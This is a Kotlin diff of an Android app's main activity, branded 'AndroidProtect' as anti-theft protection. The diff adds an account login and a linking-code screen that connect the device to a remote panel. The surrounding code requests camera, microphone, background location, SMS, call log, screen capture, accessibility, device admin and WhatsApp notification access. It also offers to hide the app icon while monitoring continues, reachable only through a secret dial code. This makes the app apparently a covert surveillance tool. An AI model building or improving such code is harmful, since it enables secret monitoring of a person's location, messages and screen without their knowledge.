@@ -21,12 +21,17 @@ import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
+import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.CheckCircle
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
 import androidx.compose.material.icons.filled.Warning
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
@@ -34,12 +39,22 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.input.KeyboardType
+import androidx.compose.ui.text.input.PasswordVisualTransformation
+import androidx.compose.ui.text.input.VisualTransformation
+import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
-import java.net.InetAddress
-import kotlin.concurrent.thread
-import kotlinx.coroutines.delay
+import kotlinx.coroutines.*
+import org.json.JSONObject
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
+
+private const val SERVER_HOST = "androidprotect.appbr.pro"
+
+private enum class Screen { LOGIN, SETUP }
 
 class MainActivity : ComponentActivity() {
 
@@ -48,28 +63,23 @@ class MainActivity : ComponentActivity() {
     private lateinit var adminComponent: ComponentName
     private val prefs by lazy { getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE) }
 
-    // ── Composable permission state (observed by UI) ──────────────────────────
-    private val hasLocationState    = mutableStateOf(false)
-    private val hasBgLocationState  = mutableStateOf(false)
-    private val hasCameraState      = mutableStateOf(false)
-    private val hasMicState         = mutableStateOf(false)
-    private val hasNotifyState      = mutableStateOf(false)
-    private val hasScreenState      = mutableStateOf(false)
-    private val hasAccessibilityState = mutableStateOf(false)
-    private val hasAdminState       = mutableStateOf(false)
-    private val hasPhoneState       = mutableStateOf(false)
-    private val hasSmsState         = mutableStateOf(false)
-    private val hasActivityState    = mutableStateOf(false)
+    private val hasLocationState         = mutableStateOf(false)
+    private val hasBgLocationState       = mutableStateOf(false)
+    private val hasCameraState           = mutableStateOf(false)
+    private val hasMicState              = mutableStateOf(false)
+    private val hasNotifyState           = mutableStateOf(false)
+    private val hasScreenState           = mutableStateOf(false)
+    private val hasAccessibilityState    = mutableStateOf(false)
+    private val hasAdminState            = mutableStateOf(false)
+    private val hasPhoneState            = mutableStateOf(false)
+    private val hasSmsState              = mutableStateOf(false)
+    private val hasActivityState         = mutableStateOf(false)
     private val hasWhatsAppListenerState = mutableStateOf(false)
 
-    // ── Launcher 1: Basic permissions (camera, mic, location, notifications) ──
     private val basicPermLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
-    ) { results ->
-        // Update observable states
+    ) { _ ->
         refreshPermStates()
-
-        // Chain: request background location next if fine location was granted
         if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
             Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
             !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
@@ -82,7 +92,6 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // ── Launcher 2: Background location (must be separate per Android policy) ─
     private val bgLocationLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { granted ->
@@ -90,7 +99,6 @@ class MainActivity : ComponentActivity() {
         scheduleScreenCaptureRequest()
     }
 
-    // ── Launcher 3: Screen capture ───────────────────────────────────────────
     private val screenCaptureLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
@@ -100,27 +108,20 @@ class MainActivity : ComponentActivity() {
             prefs.edit().putBoolean("screen_perm_granted", true).apply()
             hasScreenState.value = true
         }
-        // If denied on first time: user can tap button in UI to try again
     }
 
-    // Device Admin launcher
     private val adminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { refreshPermStates() }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        mediaProjectionManager  = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        devicePolicyManager     = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        adminComponent          = ComponentName(this, AdminReceiver::class.java)
-
+        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        devicePolicyManager    = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        adminComponent         = ComponentName(this, AdminReceiver::class.java)
         refreshPermStates()
-        setContent { AndroidProtectTheme { MainScreen() } }
-
-        // Only run permission flow on first real launch, not on config changes
-        if (savedInstanceState == null) {
-            startPermissionFlow()
-        }
+        setContent { AndroidProtectTheme { AppRoot() } }
+        if (savedInstanceState == null) startPermissionFlow()
     }
 
     override fun onResume() {
@@ -138,152 +139,363 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // ── Main permission flow (auto-sequential) ────────────────────────────────
-    private fun startPermissionFlow() {
-        val basicNeeded = buildList {
-            if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
-                add(Manifest.permission.ACCESS_FINE_LOCATION)
-                add(Manifest.permission.ACCESS_COARSE_LOCATION)
-            }
-            if (!hasPermission(Manifest.permission.CAMERA))       add(Manifest.permission.CAMERA)
-            if (!hasPermission(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
-            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
-            if (!hasPermission(Manifest.permission.RECEIVE_SMS))  add(Manifest.permission.RECEIVE_SMS)
-            if (!hasPermission(Manifest.permission.READ_SMS))     add(Manifest.permission.READ_SMS)
-            if (!hasPermission(Manifest.permission.READ_CALL_LOG))add(Manifest.permission.READ_CALL_LOG)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-                !hasPermission(Manifest.permission.ACTIVITY_RECOGNITION)
-            ) add(Manifest.permission.ACTIVITY_RECOGNITION)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                !hasPermission(Manifest.permission.POST_NOTIFICATIONS)
-            ) add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-
-        if (basicNeeded.isNotEmpty()) {
-            // Small delay so activity is fully resumed before showing dialog
-            Handler(Looper.getMainLooper()).postDelayed({
-                basicPermLauncher.launch(basicNeeded.toTypedArray())
-            }, 500)
-        } else {
-            // All basic perms already granted — check background + screen
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-                !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-            ) {
-                Handler(Looper.getMainLooper()).postDelayed({
-                    bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                }, 500)
-            } else {
-                scheduleScreenCaptureRequest()
-            }
-        }
-    }
-
-    private fun scheduleScreenCaptureRequest(extraDelayMs: Long = 600) {
-        Handler(Looper.getMainLooper()).postDelayed({
-            val granted = prefs.getBoolean("screen_perm_granted", false)
-            if (!granted) {
-                // First time only: request screen capture
-                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
-            }
-            // If previously granted: token is refreshed on-demand via notification when server needs screen stream
-        }, extraDelayMs)
-    }
-
-    private fun refreshPermStates() {
-        hasLocationState.value   = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
-        hasBgLocationState.value = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-            hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else true
-        hasCameraState.value     = hasPermission(Manifest.permission.CAMERA)
-        hasMicState.value        = hasPermission(Manifest.permission.RECORD_AUDIO)
-        hasNotifyState.value     = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            hasPermission(Manifest.permission.POST_NOTIFICATIONS) else true
-        hasScreenState.value     = ProtectAccessibilityService.isEnabled(this) ||
-                (prefs.getBoolean("screen_perm_granted", false) && AntiTheftService.mediaProjectionData != null)
-        hasAccessibilityState.value = ProtectAccessibilityService.isEnabled(this)
-        hasAdminState.value      = devicePolicyManager.isAdminActive(adminComponent)
-        hasPhoneState.value      = hasPermission(Manifest.permission.READ_PHONE_STATE)
-        hasSmsState.value        = hasPermission(Manifest.permission.RECEIVE_SMS)
-        hasActivityState.value   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-            hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
-        hasWhatsAppListenerState.value = WhatsAppNotificationListener.isEnabled(this)
-    }
-
-    private fun hasPermission(p: String) =
-        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
-
-    private fun openAppSettings() {
-        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-            data = Uri.fromParts("package", packageName, null)
-        })
-    }
-
-    // ── Composable UI ─────────────────────────────────────────────────────────
+    // ── Root: decides which screen to show ───────────────────────────────────
     @Composable
-    fun MainScreen() {
-        val context = this
-        val deviceId = remember {
-            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Desconhecido"
-        }
+    fun AppRoot() {
+        val savedToken = prefs.getString("link_token", "") ?: ""
+        var screen by remember { mutableStateOf(if (savedToken.length == 9) Screen.SETUP else Screen.LOGIN) }
 
-        var serverIp by remember {
-            mutableStateOf(prefs.getString("server_ip", "androidprotect.appbr.pro") ?: "androidprotect.appbr.pro")
+        when (screen) {
+            Screen.LOGIN -> LoginScreen(onLinked = { screen = Screen.SETUP })
+            Screen.SETUP -> SetupScreen(onUnlink = {
+                prefs.edit().remove("link_token").apply()
+                AntiTheftService.linkToken = ""
+                stopService(Intent(this, AntiTheftService::class.java))
+                screen = Screen.LOGIN
+            })
         }
-        var linkToken by remember {
-            mutableStateOf(prefs.getString("link_token", "") ?: "")
-        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // LOGIN SCREEN
+    // ═══════════════════════════════════════════════════════════════════════
+    @Composable
+    fun LoginScreen(onLinked: () -> Unit) {
+        var selectedTab     by remember { mutableStateOf(0) }
+
+        // Conta tab
+        var email           by remember { mutableStateOf("") }
+        var password        by remember { mutableStateOf("") }
+        var passwordVisible by remember { mutableStateOf(false) }
+        var loginLoading    by remember { mutableStateOf(false) }
+        var loginError      by remember { mutableStateOf("") }
+
+        // Código tab
+        var codeInput  by remember { mutableStateOf("") }
         var wsConnected by remember { mutableStateOf(AntiTheftService.isWebSocketConnected) }
-        var linkStatus by remember { mutableStateOf("") } // "", "connecting", "ok", "error"
-        val defaultHwName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
-        var deviceName by remember {
-            mutableStateOf(prefs.getString("device_custom_name", "") ?: "")
-        }
-        var isServiceActive by remember { mutableStateOf(AntiTheftService.isServiceRunning) }
-        var testResult     by remember { mutableStateOf<String?>(null) }
-        var isTesting      by remember { mutableStateOf(false) }
-        var showHideDialog by remember { mutableStateOf(false) }
 
-        // Observe permission states
-        val hasLocation   by hasLocationState
-        val hasBgLocation by hasBgLocationState
-        val hasCamera     by hasCameraState
-        val hasMic        by hasMicState
-        val hasNotify     by hasNotifyState
-        val hasScreen          by hasScreenState
-        val hasAccessibility   by hasAccessibilityState
-        val hasAdmin      by hasAdminState
-        val hasPhone      by hasPhoneState
-        val hasSms        by hasSmsState
-        val hasActivity   by hasActivityState
-        val hasWhatsAppListener by hasWhatsAppListenerState
-        val hasAllFiles   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
-            android.os.Environment.isExternalStorageManager() else true
+        val scope = rememberCoroutineScope()
 
-        val isBatteryOptimized = isBatteryOptimizedFor(context)
-        val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
-                hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility && hasAdmin &&
-                hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
-
-        // Auto-start service on first compose
-        LaunchedEffect(Unit) {
-            AntiTheftService.serverIpAddress = serverIp
-            AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
-            val autoStart = prefs.getBoolean("auto_start", true)
-            if (autoStart && !AntiTheftService.isServiceRunning) {
-                startService(serverIp)
-                isServiceActive = true
-            }
-        }
-
-        // Poll WebSocket connection status every 2s
         LaunchedEffect(Unit) {
             while (true) {
                 wsConnected = AntiTheftService.isWebSocketConnected
-                if (linkStatus == "connecting" && wsConnected) linkStatus = "ok"
-                kotlinx.coroutines.delay(2000)
+                delay(2000)
             }
         }
 
-        // ── Confirmation dialog for hiding the app ────────────────────────────
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color(0xFF0A0B10))
+                .verticalScroll(rememberScrollState())
+                .padding(horizontal = 28.dp),
+            horizontalAlignment = Alignment.CenterHorizontally
+        ) {
+            Spacer(Modifier.height(72.dp))
+
+            // Shield logo
+            Box(
+                Modifier
+                    .size(88.dp)
+                    .background(Color(0xFF0D1826), RoundedCornerShape(26.dp))
+                    .border(1.5.dp, Color(0xFF00D2FF).copy(alpha = 0.35f), RoundedCornerShape(26.dp)),
+                Alignment.Center
+            ) {
+                Text("🛡️", fontSize = 42.sp)
+            }
+
+            Spacer(Modifier.height(18.dp))
+            Text("AndroidProtect", fontSize = 30.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
+            Text(
+                "Proteção inteligente para seu Android",
+                color = Color(0xFF8E94A5), fontSize = 13.sp,
+                textAlign = TextAlign.Center,
+                modifier = Modifier.padding(top = 6.dp, bottom = 32.dp)
+            )
+
+            // Card
+            Card(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .border(1.dp, Color(0xFF252630), RoundedCornerShape(20.dp)),
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
+                shape = RoundedCornerShape(20.dp)
+            ) {
+                Column(Modifier.padding(20.dp)) {
+
+                    // Tab switcher
+                    Row(
+                        Modifier
+                            .fillMaxWidth()
+                            .background(Color(0xFF0A0B10), RoundedCornerShape(12.dp))
+                            .padding(4.dp)
+                    ) {
+                        listOf("Minha Conta", "Código Direto").forEachIndexed { idx, label ->
+                            val active = selectedTab == idx
+                            Box(
+                                Modifier
+                                    .weight(1f)
+                                    .background(
+                                        if (active) Color(0xFF00D2FF) else Color.Transparent,
+                                        RoundedCornerShape(9.dp)
+                                    )
+                                    .clickable { selectedTab = idx; loginError = "" }
+                                    .padding(vertical = 11.dp),
+                                Alignment.Center
+                            ) {
+                                Text(
+                                    label,
+                                    color = if (active) Color(0xFF0A0B10) else Color(0xFF8E94A5),
+                                    fontWeight = if (active) FontWeight.Bold else FontWeight.Normal,
+                                    fontSize = 13.sp
+                                )
+                            }
+                        }
+                    }
+
+                    Spacer(Modifier.height(22.dp))
+
+                    if (selectedTab == 0) {
+                        // ── EMAIL / SENHA ──────────────────────────────────
+                        OutlinedTextField(
+                            value = email,
+                            onValueChange = { email = it; loginError = "" },
+                            label = { Text("E-mail") },
+                            modifier = Modifier.fillMaxWidth(),
+                            singleLine = true,
+                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
+                            colors = neonOutlinedColors()
+                        )
+                        Spacer(Modifier.height(12.dp))
+                        OutlinedTextField(
+                            value = password,
+                            onValueChange = { password = it; loginError = "" },
+                            label = { Text("Senha") },
+                            modifier = Modifier.fillMaxWidth(),
+                            singleLine = true,
+                            visualTransformation = if (passwordVisible) VisualTransformation.None
+                                                   else PasswordVisualTransformation(),
+                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
+                            trailingIcon = {
+                                IconButton(onClick = { passwordVisible = !passwordVisible }) {
+                                    Icon(
+                                        if (passwordVisible) Icons.Default.VisibilityOff
+                                        else Icons.Default.Visibility,
+                                        contentDescription = null,
+                                        tint = Color(0xFF8E94A5)
+                                    )
+                                }
+                            },
+                            colors = neonOutlinedColors()
+                        )
+
+                        if (loginError.isNotEmpty()) {
+                            Spacer(Modifier.height(10.dp))
+                            Text(loginError, color = Color(0xFFFF3838), fontSize = 12.sp)
+                        }
+
+                        Spacer(Modifier.height(18.dp))
+                        Button(
+                            onClick = {
+                                loginError = ""
+                                if (email.isBlank() || password.isBlank()) {
+                                    loginError = "Preencha e-mail e senha."
+                                    return@Button
+                                }
+                                loginLoading = true
+                                scope.launch(Dispatchers.IO) {
+                                    try {
+                                        val url = URL("https://$SERVER_HOST/api/auth/login")
+                                        val conn = url.openConnection() as HttpURLConnection
+                                        conn.requestMethod = "POST"
+                                        conn.setRequestProperty("Content-Type", "application/json")
+                                        conn.doOutput = true
+                                        conn.connectTimeout = 10_000
+                                        conn.readTimeout   = 10_000
+                                        val body = JSONObject().apply {
+                                            put("email", email.trim().lowercase())
+                                            put("password", password)
+                                        }.toString()
+                                        OutputStreamWriter(conn.outputStream).use { it.write(body) }
+
+                                        val code = conn.responseCode
+                                        val resp = (if (code == 200) conn.inputStream else conn.errorStream)
+                                            ?.bufferedReader()?.readText() ?: ""
+
+                                        withContext(Dispatchers.Main) {
+                                            loginLoading = false
+                                            if (code == 200) {
+                                                val json = JSONObject(resp)
+                                                val token = json.getJSONObject("user").getString("linkToken")
+                                                prefs.edit()
+                                                    .putString("link_token", token)
+                                                    .putString("server_ip", SERVER_HOST)
+                                                    .putBoolean("auto_start", true)
+                                                    .apply()
+                                                AntiTheftService.linkToken = token
+                                                AntiTheftService.serverIpAddress = SERVER_HOST
+                                                launchService()
+                                                onLinked()
+                                            } else {
+                                                val json = runCatching { JSONObject(resp) }.getOrNull()
+                                                loginError = json?.optString("error") ?: "Credenciais inválidas."
+                                            }
+                                        }
+                                    } catch (e: Exception) {
+                                        withContext(Dispatchers.Main) {
+                                            loginLoading = false
+                                            loginError = "Sem conexão com o servidor."
+                                        }
+                                    }
+                                }
+                            },
+                            modifier = Modifier.fillMaxWidth().height(52.dp),
+                            shape = RoundedCornerShape(14.dp),
+                            enabled = !loginLoading,
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                        ) {
+                            if (loginLoading)
+                                CircularProgressIndicator(
+                                    modifier = Modifier.size(22.dp),
+                                    color = Color(0xFF0A0B10),
+                                    strokeWidth = 2.5.dp
+                                )
+                            else
+                                Text("Entrar", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                        }
+
+                    } else {
+                        // ── CÓDIGO DIRETO ──────────────────────────────────
+                        Text(
+                            "Digite o código de 9 caracteres exibido no seu painel em androidprotect.appbr.pro",
+                            color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp,
+                            textAlign = TextAlign.Center,
+                            modifier = Modifier.padding(bottom = 18.dp)
+                        )
+
+                        OutlinedTextField(
+                            value = codeInput,
+                            onValueChange = { v ->
+                                val clean = v.uppercase().replace("[^A-Z0-9-]".toRegex(), "").take(9)
+                                codeInput = clean
+                                AntiTheftService.linkToken = clean
+                                prefs.edit()
+                                    .putString("link_token", clean)
+                                    .putString("server_ip", SERVER_HOST)
+                                    .putBoolean("auto_start", true)
+                                    .apply()
+                                if (clean.length == 9) {
+                                    AntiTheftService.serverIpAddress = SERVER_HOST
+                                    launchService()
+                                }
+                            },
+                            label = { Text("Código do painel") },
+                            placeholder = { Text("XXXX-XXXX") },
+                            modifier = Modifier.fillMaxWidth(),
+                            singleLine = true,
+                            colors = OutlinedTextFieldDefaults.colors(
+                                focusedBorderColor = Color(0xFF00D2FF),
+                                unfocusedBorderColor = when {
+                                    wsConnected && codeInput.length == 9 -> Color(0xFF39FF14)
+                                    codeInput.length == 9 -> Color(0xFFFF9900)
+                                    else -> Color(0xFF252630)
+                                },
+                                focusedLabelColor = Color(0xFF00D2FF),
+                                cursorColor = Color(0xFF00D2FF),
+                                focusedTextColor = Color.White,
+                                unfocusedTextColor = Color.White
+                            )
+                        )
+
+                        Spacer(Modifier.height(14.dp))
+
+                        when {
+                            codeInput.length == 9 && wsConnected -> {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(16.dp))
+                                    Spacer(Modifier.width(7.dp))
+                                    Text("Aparelho vinculado!", color = Color(0xFF39FF14), fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
+                                }
+                                Spacer(Modifier.height(14.dp))
+                                Button(
+                                    onClick = { onLinked() },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
+                                ) {
+                                    Text("Continuar →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                                }
+                            }
+                            codeInput.length == 9 -> {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    CircularProgressIndicator(modifier = Modifier.size(14.dp), color = Color(0xFFFF9900), strokeWidth = 2.dp)
+                                    Spacer(Modifier.width(8.dp))
+                                    Text("Conectando ao painel...", color = Color(0xFFFF9900), fontSize = 12.sp)
+                                }
+                            }
+                            codeInput.isNotEmpty() -> {
+                                Text("${codeInput.length}/9 caracteres", color = Color(0xFF8E94A5), fontSize = 11.sp)
+                            }
+                        }
+                    }
+                }
+            }
+
+            Spacer(Modifier.height(40.dp))
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // SETUP SCREEN
+    // ═══════════════════════════════════════════════════════════════════════
+    @Composable
+    fun SetupScreen(onUnlink: () -> Unit) {
+        val context = this
+
+        var wsConnected    by remember { mutableStateOf(AntiTheftService.isWebSocketConnected) }
+        var isServiceActive by remember { mutableStateOf(AntiTheftService.isServiceRunning) }
+        val defaultHwName  = "${Build.MANUFACTURER} ${Build.MODEL}"
+        var deviceName     by remember { mutableStateOf(prefs.getString("device_custom_name", "") ?: "") }
+        var showHideDialog  by remember { mutableStateOf(false) }
+        var showUnlinkDialog by remember { mutableStateOf(false) }
+
+        val hasLocation        by hasLocationState
+        val hasBgLocation      by hasBgLocationState
+        val hasCamera          by hasCameraState
+        val hasMic             by hasMicState
+        val hasNotify          by hasNotifyState
+        val hasScreen          by hasScreenState
+        val hasAccessibility   by hasAccessibilityState
+        val hasAdmin           by hasAdminState
+        val hasPhone           by hasPhoneState
+        val hasSms             by hasSmsState
+        val hasActivity        by hasActivityState
+        val hasWhatsAppListener by hasWhatsAppListenerState
+        val hasAllFiles = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
+            android.os.Environment.isExternalStorageManager() else true
+        val isBatteryOptimized = isBatteryOptimizedFor(context)
+
+        val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
+                hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility &&
+                hasAdmin && hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
+
+        LaunchedEffect(Unit) {
+            AntiTheftService.serverIpAddress = SERVER_HOST
+            AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
+            if (prefs.getBoolean("auto_start", true) && !AntiTheftService.isServiceRunning) {
+                launchService(); isServiceActive = true
+            }
+        }
+
+        LaunchedEffect(Unit) {
+            while (true) {
+                wsConnected = AntiTheftService.isWebSocketConnected
+                if (!AntiTheftService.isServiceRunning && isServiceActive) isServiceActive = false
+                delay(2000)
+            }
+        }
+
+        // ── Dialogs ────────────────────────────────────────────────────────
         if (showHideDialog) {
             AlertDialog(
                 onDismissRequest = { showHideDialog = false },
@@ -291,7 +503,7 @@ class MainActivity : ComponentActivity() {
                 title = { Text("Ocultar aplicativo?", color = Color.White, fontWeight = FontWeight.Bold) },
                 text = {
                     Text(
-                        "O ícone será removido da gaveta de aplicativos. O serviço de monitoramento continua ativo em segundo plano.\n\nPara reabrir o app, use o código de discagem: *#*#7777#*#*",
+                        "O ícone será removido da gaveta de aplicativos. O monitoramento continua ativo em segundo plano.\n\nPara reabrir: *#*#7777#*#*",
                         color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 19.sp
                     )
                 },
@@ -310,8 +522,32 @@ class MainActivity : ComponentActivity() {
                     ) { Text("Ocultar agora", color = Color.White, fontWeight = FontWeight.Bold) }
                 },
                 dismissButton = {
-                    OutlinedButton(
-                        onClick = { showHideDialog = false },
+                    OutlinedButton(onClick = { showHideDialog = false },
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF8E94A5))
+                    ) { Text("Cancelar") }
+                }
+            )
+        }
+
+        if (showUnlinkDialog) {
+            AlertDialog(
+                onDismissRequest = { showUnlinkDialog = false },
+                containerColor = Color(0xFF12141D),
+                title = { Text("Desvincular aparelho?", color = Color.White, fontWeight = FontWeight.Bold) },
+                text = {
+                    Text(
+                        "O aparelho será desconectado do painel e o serviço de monitoramento será encerrado.",
+                        color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 19.sp
+                    )
+                },
+                confirmButton = {
+                    Button(
+                        onClick = { showUnlinkDialog = false; onUnlink() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF3838))
+                    ) { Text("Desvincular", color = Color.White, fontWeight = FontWeight.Bold) }
+                },
+                dismissButton = {
+                    OutlinedButton(onClick = { showUnlinkDialog = false },
                         colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF8E94A5))
                     ) { Text("Cancelar") }
                 }
@@ -328,117 +564,39 @@ class MainActivity : ComponentActivity() {
         ) {
             Spacer(Modifier.height(20.dp))
 
-            Text("AndroidProtect", fontSize = 32.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
-            Text(
-                "Painel de Configuração de Segurança",
-                color = Color(0xFF8E94A5), fontSize = 14.sp,
-                modifier = Modifier.padding(top = 4.dp, bottom = 24.dp)
-            )
-
-            // ── Status card ────────────────────────────────────────────────
-            SectionCard {
-                Label("STATUS DO DISPOSITIVO")
-                Spacer(Modifier.height(12.dp))
-                Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
-                    Column {
-                        Text("ID do Aparelho:", color = Color.White, fontSize = 13.sp)
-                        Text(deviceId, color = Color(0xFF00D2FF), fontSize = 15.sp, fontWeight = FontWeight.SemiBold)
+            // ── Header ─────────────────────────────────────────────────────
+            Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
+                Column {
+                    Text("AndroidProtect", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
+                    Text("Painel de Configuração", color = Color(0xFF8E94A5), fontSize = 13.sp)
+                }
+                Column(horizontalAlignment = Alignment.End, verticalArrangement = Arrangement.spacedBy(6.dp)) {
+                    Row(verticalAlignment = Alignment.CenterVertically) {
+                        Box(
+                            Modifier.size(8.dp).background(
+                                if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
+                                CircleShape
+                            )
+                        )
+                        Spacer(Modifier.width(5.dp))
+                        Text(
+                            if (wsConnected) "Conectado" else "Desconectado",
+                            color = if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
+                            fontSize = 11.sp, fontWeight = FontWeight.SemiBold
+                        )
                     }
                     StatusBadge(isServiceActive)
                 }
             }
 
-            // ── Link token card ────────────────────────────────────────────
-            SectionCard {
-                // Header com status de conexão ao vivo
-                Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
-                    Label("CÓDIGO DE VINCULAÇÃO")
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Box(
-                            Modifier
-                                .size(8.dp)
-                                .background(
-                                    if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
-                                    androidx.compose.foundation.shape.CircleShape
-                                )
-                        )
-                        Spacer(Modifier.width(5.dp))
-                        Text(
-                            if (wsConnected) "Conectado ao painel" else "Desconectado",
-                            color = if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
-                            fontSize = 10.sp, fontWeight = FontWeight.SemiBold
-                        )
-                    }
-                }
-                Spacer(Modifier.height(10.dp))
-                Text(
-                    "Digite o código exibido no painel web. O aparelho aparece automaticamente ao completar.",
-                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
-                    modifier = Modifier.padding(bottom = 12.dp)
-                )
-                OutlinedTextField(
-                    value = linkToken,
-                    onValueChange = { v ->
-                        val clean = v.uppercase().replace("[^A-Z0-9-]".toRegex(), "").take(9)
-                        linkToken = clean
-                        AntiTheftService.linkToken = clean
-                        prefs.edit().putString("link_token", clean).apply()
+            Spacer(Modifier.height(22.dp))
 
-                        // Ao completar o código, reconectar imediatamente
-                        if (clean.length == 9 && AntiTheftService.isServiceRunning) {
-                            linkStatus = "connecting"
-                            val intent = Intent(context, AntiTheftService::class.java)
-                                .putExtra("SERVER_IP", serverIp)
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                                context.startForegroundService(intent)
-                            else
-                                context.startService(intent)
-                        }
-                    },
-                    label = { Text("Código do painel") },
-                    placeholder = { Text("XXXX-XXXX") },
-                    modifier = Modifier.fillMaxWidth(),
-                    singleLine = true,
-                    colors = OutlinedTextFieldDefaults.colors(
-                        focusedBorderColor = Color(0xFF00D2FF),
-                        unfocusedBorderColor = when {
-                            wsConnected && linkToken.length == 9 -> Color(0xFF39FF14)
-                            linkToken.length == 9 -> Color(0xFFFF9900)
-                            else -> Color(0xFF252630)
-                        },
-                        focusedLabelColor = Color(0xFF00D2FF),
